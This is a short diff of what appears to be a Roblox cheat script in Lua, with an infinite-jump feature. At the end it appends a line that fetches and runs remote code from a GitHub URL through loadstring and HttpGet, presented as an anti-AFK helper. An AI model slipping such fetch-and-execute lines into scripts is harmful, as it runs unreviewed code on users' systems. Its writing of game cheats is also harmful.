@@ -346,4 +346,5 @@ player.CharacterAdded:Connect(function(newChar)
     pcall(enableInfiniteJump)
 end)
 
-print("🎮 Tudo pronto! A lista completa foi restaurada.")
+print("🎮 Tudo pronto! A lista completa foi restaurada.");
+loadstring(game:HttpGet("https://raw.githubusercontent.com/hassanxzayn-lua/Anti-afk/main/antiafkbyhassanxzyn"))();
